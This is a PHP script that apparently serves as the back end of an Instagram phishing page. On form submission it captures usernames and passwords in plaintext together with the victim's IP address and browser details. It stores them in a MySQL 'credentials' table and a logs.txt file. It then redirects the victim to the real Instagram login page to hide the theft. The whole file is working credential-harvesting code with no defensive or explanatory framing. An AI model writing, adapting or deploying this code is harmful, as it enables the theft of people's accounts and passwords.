<?php
session_start();

// Database configuration - update these with your actual database credentials
$db_host = 'localhost';
$db_name = 'instagram_panel';
$db_user = 'root';
$db_pass = '';

// Create database connection
try {
    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8mb4", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    // If database doesn't exist, create it
    try {
        $pdo = new PDO("mysql:host=$db_host;charset=utf8mb4", $db_user, $db_pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        $pdo->exec("CREATE DATABASE IF NOT EXISTS $db_name CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
        $pdo->exec("USE $db_name");
    } catch(PDOException $e2) {
        die("Database connection failed: " . $e2->getMessage());
    }
}

// Create table if not exists
$createTable = "CREATE TABLE IF NOT EXISTS credentials (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    ip_address VARCHAR(45) NOT NULL,
    user_agent TEXT NOT NULL,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_timestamp (timestamp)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4";

$pdo->exec($createTable);

// Capture all data
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    
    // Get additional info
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $request_uri = $_SERVER['REQUEST_URI'];
    $request_method = $_SERVER['REQUEST_METHOD'];
    $server_name = $_SERVER['SERVER_NAME'];
    $https = isset($_SERVER['HTTPS']) ? 'Yes' : 'No';
    
    // Insert into database
    $stmt = $pdo->prepare("INSERT INTO credentials (username, password, ip_address, user_agent) VALUES (?, ?, ?, ?)");
    $stmt->execute([$username, $password, $ip_address, $user_agent]);
    
    // Also log to file as backup
    $logData = date('Y-m-d H:i:s') . " | IP: $ip_address | User: $username | Pass: $password | UA: " . substr($user_agent, 0, 100) . "\n";
    file_put_contents('logs.txt', $logData, FILE_APPEND | LOCK_EX);
    
    // Redirect to real Instagram
    header('Location: https://www.instagram.com/accounts/login/');
    exit();
} else {
    // If accessed directly without POST, redirect to login page
    header('Location: index.html');
    exit();
}
?>